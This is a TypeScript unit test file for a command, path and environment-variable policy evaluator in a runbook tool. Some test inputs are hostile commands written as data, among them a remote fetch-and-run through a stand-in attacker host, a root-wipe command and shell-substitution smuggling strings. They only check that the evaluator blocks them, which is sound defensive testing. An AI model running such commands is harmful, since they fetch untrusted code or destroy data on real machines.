import * as os from 'node:os';
import * as path from 'node:path';
import { PolicyEvaluator, createDefaultEvaluator } from '../../src/policy/evaluator.js';
import { DEFAULT_POLICY, type PolicyConfig } from '../../src/policy/schema.js';
import { RUNS_DIR } from '../../src/paths.js';

describe('PolicyEvaluator', () => {
  const repoRoot = '/test/repo';
  const tmpDir = os.tmpdir();
  const denyRunPolicy = (allow: string[]): PolicyConfig => ({
    ...DEFAULT_POLICY,
    default: {
      ...DEFAULT_POLICY.default,
      mode: 'deny',
      run: { allow, deny: [] },
    },
  });

  describe('checkCommand', () => {
    it('should allow commands in allow list', () => {
      const evaluator = new PolicyEvaluator(DEFAULT_POLICY, { repoRoot });
      const decision = evaluator.checkCommand('git status');

      expect(decision.allowed).toBe(true);
      expect(decision.requiresPrompt).toBe(false);
    });

    it('should deny commands in deny list', () => {
      const evaluator = new PolicyEvaluator(DEFAULT_POLICY, { repoRoot });
      const decision = evaluator.checkCommand('sudo rm -rf /');

      expect(decision.allowed).toBe(false);
      expect(decision.requiresPrompt).toBe(false);
      expect(decision.reason).toContain('blocked by policy');
    });

    it('should require prompt for unlisted commands in prompted mode', () => {
      const evaluator = new PolicyEvaluator(DEFAULT_POLICY, { repoRoot });
      const decision = evaluator.checkCommand('unknown-command');

      expect(decision.allowed).toBe(false);
      expect(decision.requiresPrompt).toBe(true);
    });

    it('should deny unlisted commands in deny mode', () => {
      const policy: PolicyConfig = {
        ...DEFAULT_POLICY,
        default: {
          ...DEFAULT_POLICY.default,
          mode: 'deny',
        },
      };
      const evaluator = new PolicyEvaluator(policy, { repoRoot });
      const decision = evaluator.checkCommand('unknown-command');

      expect(decision.allowed).toBe(false);
      expect(decision.requiresPrompt).toBe(false);
    });

    it('should allow all commands in execute mode', () => {
      const policy: PolicyConfig = {
        ...DEFAULT_POLICY,
        default: {
          ...DEFAULT_POLICY.default,
          mode: 'execute',
          run: {
            allow: [],
            deny: [],
          },
        },
      };
      const evaluator = new PolicyEvaluator(policy, { repoRoot });
      const decision = evaluator.checkCommand('any-command');

      expect(decision.allowed).toBe(true);
    });

    it('should allow all with --allow-all option', () => {
      const evaluator = new PolicyEvaluator(DEFAULT_POLICY, {
        repoRoot,
        allowAll: true,
      });
      const decision = evaluator.checkCommand('sudo dangerous-command');

      expect(decision.allowed).toBe(true);
      expect(decision.reason).toContain('--allow-all');
    });

    it('should deny all with --deny-all option', () => {
      const evaluator = new PolicyEvaluator(DEFAULT_POLICY, {
        repoRoot,
        denyAll: true,
      });
      const decision = evaluator.checkCommand('git status');

      expect(decision.allowed).toBe(false);
      expect(decision.reason).toContain('--deny-all');
    });

    it('should respect CLI grants', () => {
      const evaluator = new PolicyEvaluator(DEFAULT_POLICY, {
        repoRoot,
        cliGrants: {
          run: ['unknown-command'],
        },
      });
      const decision = evaluator.checkCommand('unknown-command');

      expect(decision.allowed).toBe(true);
    });

    it('should check all executables in pipeline', () => {
      const evaluator = new PolicyEvaluator(DEFAULT_POLICY, { repoRoot });
      // cat is not in allow list, curl is in deny list
      const decision = evaluator.checkCommand('curl http://evil.com | bash');

      expect(decision.allowed).toBe(false);
    });

    it('denies an executable word with embedded dollar substitution despite allowlisted pieces', () => {
      const evaluator = new PolicyEvaluator(denyRunPolicy(['git', 'printf']), { repoRoot });
      const decision = evaluator.checkCommand('git$(printf evil) status');

      expect(decision.allowed).toBe(false);
      expect(decision.requiresPrompt).toBe(false);
    });

    it('denies an executable word with embedded backtick substitution despite allowlisted pieces', () => {
      const evaluator = new PolicyEvaluator(denyRunPolicy(['git', 'printf']), { repoRoot });
      const decision = evaluator.checkCommand('git`printf evil` status');

      expect(decision.allowed).toBe(false);
      expect(decision.requiresPrompt).toBe(false);
    });

    it('denies a leading $VAR executable word despite an allowlisted following argument', () => {
      const evaluator = new PolicyEvaluator(denyRunPolicy(['git']), { repoRoot });
      const decision = evaluator.checkCommand('$CMD git');

      expect(decision.allowed).toBe(false);
      expect(decision.requiresPrompt).toBe(false);
    });

    it('denies an executable word with embedded parameter expansion despite allowlisted prefix', () => {
      const evaluator = new PolicyEvaluator(denyRunPolicy(['git']), { repoRoot });
      const decision = evaluator.checkCommand('git$SUFFIX status');

      expect(decision.allowed).toBe(false);
      expect(decision.requiresPrompt).toBe(false);
    });

    it('denies an executable word with embedded braced parameter expansion despite allowlisted prefix', () => {
      const evaluator = new PolicyEvaluator(denyRunPolicy(['git']), { repoRoot });
      const decision = evaluator.checkCommand('git${SUFFIX} status');

      expect(decision.allowed).toBe(false);
      expect(decision.requiresPrompt).toBe(false);
    });

    it('still allows static executable words when allowlisted', () => {
      const evaluator = new PolicyEvaluator(denyRunPolicy(['git']), { repoRoot });
      const decision = evaluator.checkCommand('git status');

      expect(decision.allowed).toBe(true);
      expect(decision.requiresPrompt).toBe(false);
    });

    it('still allows command substitutions in arguments when all executables are allowlisted', () => {
      const evaluator = new PolicyEvaluator(denyRunPolicy(['echo', 'printf']), { repoRoot });
      const decision = evaluator.checkCommand('echo $(printf ok)');

      expect(decision.allowed).toBe(true);
      expect(decision.requiresPrompt).toBe(false);
    });

    it('denies shell wrappers when the wrapper executable is not allowlisted', () => {
      const evaluator = new PolicyEvaluator(denyRunPolicy(['git']), { repoRoot });
      const decision = evaluator.checkCommand('sh -c "git status"');

      expect(decision.allowed).toBe(false);
      expect(decision.requiresPrompt).toBe(false);
    });

    it('denies dynamic shell wrapper scripts despite an allowlisted wrapper', () => {
      const evaluator = new PolicyEvaluator(denyRunPolicy(['sh']), { repoRoot });
      const decision = evaluator.checkCommand('sh -c "$CMD"');

      expect(decision.allowed).toBe(false);
      expect(decision.requiresPrompt).toBe(false);
    });

    it('should deny takes precedence over allow', () => {
      const policy: PolicyConfig = {
        version: 1,
        default: {
          mode: 'execute',
          run: {
            allow: ['git', 'sudo'], // sudo in both lists
            deny: ['sudo'],
          },
          read: { allow: [], deny: [] },
          write: { allow: [], deny: [] },
          env: { allow: [], deny: [] },
        },
        overrides: [],
        grants: [],
      };
      const evaluator = new PolicyEvaluator(policy, { repoRoot });
      const decision = evaluator.checkCommand('sudo apt-get install');

      expect(decision.allowed).toBe(false);
    });
  });

  describe('checkPath', () => {
    it('should allow paths within repo', () => {
      const evaluator = new PolicyEvaluator(DEFAULT_POLICY, { repoRoot });
      const decision = evaluator.checkPath(path.join(repoRoot, 'src/index.ts'), 'read');

      expect(decision.allowed).toBe(true);
    });

    it('should allow paths within tmp', () => {
      const evaluator = new PolicyEvaluator(DEFAULT_POLICY, { repoRoot, tmpDir });
      const decision = evaluator.checkPath(path.join(tmpDir, 'test.txt'), 'read');

      expect(decision.allowed).toBe(true);
    });

    it('should deny .env files', () => {
      const evaluator = new PolicyEvaluator(DEFAULT_POLICY, { repoRoot });
      const decision = evaluator.checkPath(path.join(repoRoot, '.env'), 'read');

      expect(decision.allowed).toBe(false);
    });

    it('should deny secret files', () => {
      const evaluator = new PolicyEvaluator(DEFAULT_POLICY, { repoRoot });
      const decision = evaluator.checkPath(path.join(repoRoot, 'my-secret.json'), 'read');

      expect(decision.allowed).toBe(false);
    });

    it('should require prompt for paths outside allowed areas', () => {
      const evaluator = new PolicyEvaluator(DEFAULT_POLICY, { repoRoot });
      const decision = evaluator.checkPath('/etc/passwd', 'read');

      expect(decision.allowed).toBe(false);
      expect(decision.requiresPrompt).toBe(true);
    });

    it('should allow write to generated .rundown subpaths', () => {
      const evaluator = new PolicyEvaluator(DEFAULT_POLICY, { repoRoot });
      const decision = evaluator.checkPath(path.join(repoRoot, RUNS_DIR, 'state.json'), 'write');

      expect(decision.allowed).toBe(true);
    });

    it('should respect CLI grants for paths', () => {
      const evaluator = new PolicyEvaluator(DEFAULT_POLICY, {
        repoRoot,
        cliGrants: {
          read: ['/etc/**'],
        },
      });
      const decision = evaluator.checkPath('/etc/passwd', 'read');

      expect(decision.allowed).toBe(true);
    });
  });

  describe('checkEnv', () => {
    it('should allow PATH variable', () => {
      const evaluator = new PolicyEvaluator(DEFAULT_POLICY, { repoRoot });
      const decision = evaluator.checkEnv('PATH');

      expect(decision.allowed).toBe(true);
    });

    it('should allow HOME variable', () => {
      const evaluator = new PolicyEvaluator(DEFAULT_POLICY, { repoRoot });
      const decision = evaluator.checkEnv('HOME');

      expect(decision.allowed).toBe(true);
    });

    it('should deny TOKEN variables', () => {
      const evaluator = new PolicyEvaluator(DEFAULT_POLICY, { repoRoot });
      const decision = evaluator.checkEnv('GITHUB_TOKEN');

      expect(decision.allowed).toBe(false);
    });

    it('should deny AWS variables', () => {
      const evaluator = new PolicyEvaluator(DEFAULT_POLICY, { repoRoot });
      const decision = evaluator.checkEnv('AWS_SECRET_ACCESS_KEY');

      expect(decision.allowed).toBe(false);
    });

    it('should allow npm_ prefixed variables', () => {
      const evaluator = new PolicyEvaluator(DEFAULT_POLICY, { repoRoot });
      const decision = evaluator.checkEnv('npm_config_registry');

      expect(decision.allowed).toBe(true);
    });

    it('should allow RUNDOWN_ prefixed variables', () => {
      const evaluator = new PolicyEvaluator(DEFAULT_POLICY, { repoRoot });
      const decision = evaluator.checkEnv('RUNDOWN_LOG_LEVEL');

      expect(decision.allowed).toBe(true);
    });
  });

  describe('filterEnvironment', () => {
    it('should filter out sensitive variables', () => {
      const evaluator = new PolicyEvaluator(DEFAULT_POLICY, { repoRoot });
      const env = {
        PATH: '/usr/bin',
        HOME: '/home/user',
        GITHUB_TOKEN: 'secret123',
        AWS_ACCESS_KEY_ID: 'AKIA...',
        NODE_ENV: 'development',
      };

      const filtered = evaluator.filterEnvironment(env);

      expect(filtered.PATH).toBe('/usr/bin');
      expect(filtered.HOME).toBe('/home/user');
      expect(filtered.NODE_ENV).toBe('development');
      expect(filtered.GITHUB_TOKEN).toBeUndefined();
      expect(filtered.AWS_ACCESS_KEY_ID).toBeUndefined();
    });
  });

  describe('session grants', () => {
    it('should allow commands after session grant', () => {
      const evaluator = new PolicyEvaluator(DEFAULT_POLICY, { repoRoot });

      // Initially requires prompt
      let decision = evaluator.checkCommand('unknown-command');
      expect(decision.requiresPrompt).toBe(true);

      // Add session grant
      evaluator.addSessionGrant('run', 'unknown-command');

      // Now allowed
      decision = evaluator.checkCommand('unknown-command');
      expect(decision.allowed).toBe(true);
    });

    it('should allow read paths after session grant', () => {
      const evaluator = new PolicyEvaluator(DEFAULT_POLICY, { repoRoot });

      // Initially requires prompt for path outside repo
      let decision = evaluator.checkPath('/etc/passwd', 'read');
      expect(decision.requiresPrompt).toBe(true);

      // Add session grant for read path
      evaluator.addSessionGrant('read', '/etc/**');

      // Now allowed
      decision = evaluator.checkPath('/etc/passwd', 'read');
      expect(decision.allowed).toBe(true);
      expect(decision.reason).toBe('Path allowed by session grant');
    });

    it('should allow write paths after session grant', () => {
      const evaluator = new PolicyEvaluator(DEFAULT_POLICY, { repoRoot });

      // Initially requires prompt for path outside repo
      let decision = evaluator.checkPath('/var/log/test.log', 'write');
      expect(decision.requiresPrompt).toBe(true);

      // Add session grant for write path
      evaluator.addSessionGrant('write', '/var/log/**');

      // Now allowed
      decision = evaluator.checkPath('/var/log/test.log', 'write');
      expect(decision.allowed).toBe(true);
      expect(decision.reason).toBe('Path allowed by session grant');
    });

    it('should allow env vars after session grant', () => {
      const evaluator = new PolicyEvaluator(DEFAULT_POLICY, { repoRoot });

      // Initially denied (API_KEY blocked)
      let decision = evaluator.checkEnv('API_KEY');
      expect(decision.allowed).toBe(false);

      // Add session grant for env
      evaluator.addSessionGrant('env', 'API_KEY');

      // Now allowed
      decision = evaluator.checkEnv('API_KEY');
      expect(decision.allowed).toBe(true);
      expect(decision.reason).toBe('Environment variable allowed by session grant');
    });

    it('should not match session grant with wrong type', () => {
      const evaluator = new PolicyEvaluator(DEFAULT_POLICY, { repoRoot });

      // Add a run session grant
      evaluator.addSessionGrant('run', 'test-command');

      // Should not affect env check
      const decision = evaluator.checkEnv('test-command');
      expect(decision.allowed).toBe(false);
    });
  });

  describe('runbook overrides', () => {
    it('should apply runbook-specific overrides', () => {
      // Create a minimal policy with overrides
      const policy: PolicyConfig = {
        version: 1,
        default: {
          mode: 'deny', // Default deny - nothing allowed
          run: { allow: [], deny: [] },
          read: { allow: [], deny: [] },
          write: { allow: [], deny: [] },
          env: { allow: [], deny: [] },
        },
        overrides: [
          {
            runbook: 'deploy/*.runbook.md',
            mode: 'execute', // Override to allow all for deploy runbooks
            run: {
              allow: ['kubectl'],
              deny: [],
            },
          },
        ],
        grants: [],
      };
      const evaluator = new PolicyEvaluator(policy, {
        repoRoot,
        runbookPath: 'deploy/production.runbook.md',
      });

      // kubectl should be allowed because override adds it to allow list and mode is execute
      const decision = evaluator.checkCommand('kubectl apply -f manifest.yaml');
      expect(decision.allowed).toBe(true);
    });

    it('should not apply non-matching overrides', () => {
      const policy: PolicyConfig = {
        version: 1,
        default: {
          mode: 'deny', // Default deny - nothing allowed
          run: { allow: [], deny: [] },
          read: { allow: [], deny: [] },
          write: { allow: [], deny: [] },
          env: { allow: [], deny: [] },
        },
        overrides: [
          {
            runbook: 'deploy/*.runbook.md',
            mode: 'execute',
            run: {
              allow: ['kubectl'],
              deny: [],
            },
          },
        ],
        grants: [],
      };
      const evaluator = new PolicyEvaluator(policy, {
        repoRoot,
        runbookPath: 'test/unit.runbook.md',
      });

      // kubectl should be denied because the override doesn't match test/unit.runbook.md
      const decision = evaluator.checkCommand('kubectl get pods');
      expect(decision.allowed).toBe(false);
      expect(decision.requiresPrompt).toBe(false); // mode is deny, not prompted
    });

    it('should apply overrides after setRunbookPath is called', () => {
      const policy: PolicyConfig = {
        version: 1,
        default: {
          mode: 'deny',
          run: { allow: [], deny: [] },
          read: { allow: [], deny: [] },
          write: { allow: [], deny: [] },
          env: { allow: [], deny: [] },
        },
        overrides: [
          {
            runbook: 'deploy/*.runbook.md',
            mode: 'execute',
            run: {
              allow: ['kubectl'],
              deny: [],
            },
          },
        ],
        grants: [],
      };
      // Create evaluator without runbookPath
      const evaluator = new PolicyEvaluator(policy, { repoRoot });

      // Initially kubectl should be denied (no runbook override applies)
      let decision = evaluator.checkCommand('kubectl get pods');
      expect(decision.allowed).toBe(false);

      // Now set runbook path that matches the override
      evaluator.setRunbookPath('deploy/production.runbook.md');
      expect(evaluator.getRunbookPath()).toBe('deploy/production.runbook.md');

      // kubectl should now be allowed because override applies
      decision = evaluator.checkCommand('kubectl get pods');
      expect(decision.allowed).toBe(true);
    });

    it('should remove override when runbookPath is cleared', () => {
      const policy: PolicyConfig = {
        version: 1,
        default: {
          mode: 'deny',
          run: { allow: [], deny: [] },
          read: { allow: [], deny: [] },
          write: { allow: [], deny: [] },
          env: { allow: [], deny: [] },
        },
        overrides: [
          {
            runbook: 'deploy/*.runbook.md',
            mode: 'execute',
            run: {
              allow: ['kubectl'],
              deny: [],
            },
          },
        ],
        grants: [],
      };
      const evaluator = new PolicyEvaluator(policy, {
        repoRoot,
        runbookPath: 'deploy/production.runbook.md',
      });

      // kubectl allowed with matching runbook
      let decision = evaluator.checkCommand('kubectl get pods');
      expect(decision.allowed).toBe(true);

      // Clear runbook path
      evaluator.setRunbookPath(undefined);
      expect(evaluator.getRunbookPath()).toBeUndefined();

      // kubectl should now be denied (back to default policy)
      decision = evaluator.checkCommand('kubectl get pods');
      expect(decision.allowed).toBe(false);
    });
  });

  describe('createDefaultEvaluator', () => {
    it('should create evaluator with default policy', () => {
      const evaluator = createDefaultEvaluator({ repoRoot });

      const decision = evaluator.checkCommand('git status');
      expect(decision.allowed).toBe(true);
    });
  });

  describe('policy grants', () => {
    it('should apply grants from policy config', () => {
      const policy: PolicyConfig = {
        version: 1,
        default: {
          mode: 'deny',
          run: { allow: [], deny: [] },
          read: { allow: [], deny: [] },
          write: { allow: [], deny: [] },
          env: { allow: [], deny: [] },
        },
        overrides: [],
        grants: [
          {
            type: 'run',
            pattern: 'custom-tool',
            scope: 'session',
            grantedAt: new Date().toISOString(),
          },
        ],
      };
      const evaluator = new PolicyEvaluator(policy, { repoRoot });

      const decision = evaluator.checkCommand('custom-tool --version');
      expect(decision.allowed).toBe(true);
    });

    it('should handle empty grants array', () => {
      const policy: PolicyConfig = {
        version: 1,
        default: {
          mode: 'prompted',
          run: { allow: ['git'], deny: [] },
          read: { allow: [], deny: [] },
          write: { allow: [], deny: [] },
          env: { allow: [], deny: [] },
        },
        overrides: [],
        grants: [],
      };
      const evaluator = new PolicyEvaluator(policy, { repoRoot });

      // Should still work without grants
      const decision = evaluator.checkCommand('git status');
      expect(decision.allowed).toBe(true);
    });

    it('should apply read grants from policy config', () => {
      const policy: PolicyConfig = {
        version: 1,
        default: {
          mode: 'deny',
          run: { allow: [], deny: [] },
          read: { allow: [], deny: [] },
          write: { allow: [], deny: [] },
          env: { allow: [], deny: [] },
        },
        overrides: [],
        grants: [
          {
            type: 'read',
            pattern: '/custom/path/**',
            scope: 'session',
            grantedAt: new Date().toISOString(),
          },
        ],
      };
      const evaluator = new PolicyEvaluator(policy, { repoRoot });

      const decision = evaluator.checkPath('/custom/path/file.txt', 'read');
      expect(decision.allowed).toBe(true);
    });
  });

  describe('edge cases', () => {
    it('should deny command that cannot be parsed', () => {
      const evaluator = new PolicyEvaluator(DEFAULT_POLICY, { repoRoot });

      // Empty command should not be parseable
      const decision = evaluator.checkCommand('');
      expect(decision.allowed).toBe(false);
      expect(decision.reason).toContain('Could not parse command');
    });

    it('should use process.cwd when repoRoot not provided', () => {
      const evaluator = new PolicyEvaluator(DEFAULT_POLICY, {});

      expect(evaluator.getRepoRoot()).toBe(process.cwd());
    });

    it('should use os.tmpdir when tmpDir not provided', () => {
      const evaluator = new PolicyEvaluator(DEFAULT_POLICY, {});

      expect(evaluator.getTmpDir()).toBe(os.tmpdir());
    });

    it('should return policy via getPolicy()', () => {
      const evaluator = new PolicyEvaluator(DEFAULT_POLICY, { repoRoot });

      expect(evaluator.getPolicy()).toBe(DEFAULT_POLICY);
    });

    it('should handle checkPath denyAll flag', () => {
      const evaluator = new PolicyEvaluator(DEFAULT_POLICY, {
        repoRoot,
        denyAll: true,
      });

      const decision = evaluator.checkPath('/any/path', 'read');
      expect(decision.allowed).toBe(false);
      expect(decision.reason).toContain('--deny-all');
    });

    it('should handle checkPath allowAll flag', () => {
      const evaluator = new PolicyEvaluator(DEFAULT_POLICY, {
        repoRoot,
        allowAll: true,
      });

      const decision = evaluator.checkPath('/any/path', 'read');
      expect(decision.allowed).toBe(true);
      expect(decision.reason).toContain('--allow-all');
    });

    it('should handle checkEnv denyAll flag', () => {
      const evaluator = new PolicyEvaluator(DEFAULT_POLICY, {
        repoRoot,
        denyAll: true,
      });

      const decision = evaluator.checkEnv('PATH');
      expect(decision.allowed).toBe(false);
      expect(decision.reason).toContain('--deny-all');
    });

    it('should handle checkEnv allowAll flag', () => {
      const evaluator = new PolicyEvaluator(DEFAULT_POLICY, {
        repoRoot,
        allowAll: true,
      });

      const decision = evaluator.checkEnv('SECRET_TOKEN');
      expect(decision.allowed).toBe(true);
      expect(decision.reason).toContain('--allow-all');
    });

    it('should handle env CLI grants', () => {
      const evaluator = new PolicyEvaluator(DEFAULT_POLICY, {
        repoRoot,
        cliGrants: {
          env: ['CUSTOM_*'],
        },
      });

      const decision = evaluator.checkEnv('CUSTOM_VAR');
      expect(decision.allowed).toBe(true);
      expect(decision.reason).toBe('Environment variable allowed by CLI grant');
    });

    it('should handle path in execute mode when not in allow list', () => {
      const policy: PolicyConfig = {
        version: 1,
        default: {
          mode: 'execute',
          run: { allow: [], deny: [] },
          read: { allow: [], deny: [] },
          write: { allow: [], deny: [] },
          env: { allow: [], deny: [] },
        },
        overrides: [],
        grants: [],
      };
      const evaluator = new PolicyEvaluator(policy, { repoRoot });

      // In execute mode, should be allowed even when not in allow list
      const decision = evaluator.checkPath('/random/path/file.txt', 'read');
      expect(decision.allowed).toBe(true);
    });

    it('should handle env in execute mode when not in allow list', () => {
      const policy: PolicyConfig = {
        version: 1,
        default: {
          mode: 'execute',
          run: { allow: [], deny: [] },
          read: { allow: [], deny: [] },
          write: { allow: [], deny: [] },
          env: { allow: [], deny: [] },
        },
        overrides: [],
        grants: [],
      };
      const evaluator = new PolicyEvaluator(policy, { repoRoot });

      // In execute mode, should be allowed even when not in allow list
      const decision = evaluator.checkEnv('RANDOM_VAR');
      expect(decision.allowed).toBe(true);
    });

    it('should handle override without specific rules (only mode)', () => {
      const policy: PolicyConfig = {
        version: 1,
        default: {
          mode: 'deny',
          run: { allow: [], deny: [] },
          read: { allow: [], deny: [] },
          write: { allow: [], deny: [] },
          env: { allow: [], deny: [] },
        },
        overrides: [
          {
            runbook: 'test/*.md',
            mode: 'execute',
            // No run/read/write/env rules
          },
        ],
        grants: [],
      };
      const evaluator = new PolicyEvaluator(policy, {
        repoRoot,
        runbookPath: 'test/example.md',
      });

      // Should use override mode (execute) but no extra rules
      const decision = evaluator.checkCommand('any-command');
      expect(decision.allowed).toBe(true);
    });

    it('should skip undefined values in filterEnvironment', () => {
      const evaluator = new PolicyEvaluator(DEFAULT_POLICY, { repoRoot });
      const env: NodeJS.ProcessEnv = {
        PATH: '/usr/bin',
        UNDEFINED_VAR: undefined,
      };

      const filtered = evaluator.filterEnvironment(env);

      expect(filtered.PATH).toBe('/usr/bin');
      expect('UNDEFINED_VAR' in filtered).toBe(false);
    });
  });

  describe('CLI grants precedence', () => {
    it('CLI grants take precedence for commands', () => {
      // CLI grant should allow even if default mode would deny
      const policy: PolicyConfig = {
        version: 1,
        default: {
          mode: 'deny',
          run: { allow: [], deny: [] },
          read: { allow: [], deny: [] },
          write: { allow: [], deny: [] },
          env: { allow: [], deny: [] },
        },
        overrides: [],
        grants: [],
      };
      const evaluator = new PolicyEvaluator(policy, {
        repoRoot,
        cliGrants: { run: ['special-tool'] },
      });

      const decision = evaluator.checkCommand('special-tool');
      expect(decision.allowed).toBe(true);
    });

    it('CLI grants with session grants both work', () => {
      const evaluator = new PolicyEvaluator(DEFAULT_POLICY, {
        repoRoot,
        cliGrants: { run: ['cli-tool'] },
      });

      // Add session grant for different command
      evaluator.addSessionGrant('run', 'session-tool');

      // Both should be allowed
      expect(evaluator.checkCommand('cli-tool').allowed).toBe(true);
      expect(evaluator.checkCommand('session-tool').allowed).toBe(true);
    });
  });
});
